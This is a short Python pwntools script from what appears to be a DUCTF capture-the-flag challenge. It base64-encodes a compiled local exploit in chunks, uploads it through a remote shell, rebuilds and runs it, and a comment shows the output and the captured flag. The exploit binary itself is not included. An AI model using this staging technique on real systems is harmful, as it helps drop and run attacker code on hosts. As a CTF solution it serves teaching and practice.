from pwn import *
from tqdm import tqdm
from base64 import b64encode
import gzip

expl = open('./exploit', 'rb').read()
expl = b64encode(gzip.compress(expl)).decode()
chunks = [expl[i:i+128] for i in range(0, len(expl), 128)]

conn = remote('0.0.0.0', 1337)
conn.recvuntil(b'$')
conn.sendline(b'cd /tmp')

for i, chunk in tqdm(list(enumerate(chunks))):
    conn.sendlineafter(b'$', f'echo -n {chunk} | base64 -d > expl.{i:04}'.encode())

conn.sendlineafter(b'$', b'cat expl* > exploit.gz')
conn.sendlineafter(b'$', b'gzip -d exploit.gz')
conn.sendlineafter(b'$', b'rm expl.*')

conn.sendlineafter(b'$', b'chmod +x exploit')

"""
now connect with nc and execute /tmp/exploit:

❯ nc 0.0.0.0 1337
bash: cannot set terminal process group (896): Inappropriate ioctl for device
bash: no job control in this shell
ctf@c43f9d85c466:/$ /tmp/exploit
/tmp/exploit
a
a
a
a
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaa
DUCTF{r4c1ng_sh4r3d_m3mory_t0_th3_f1nish_flag}
"""
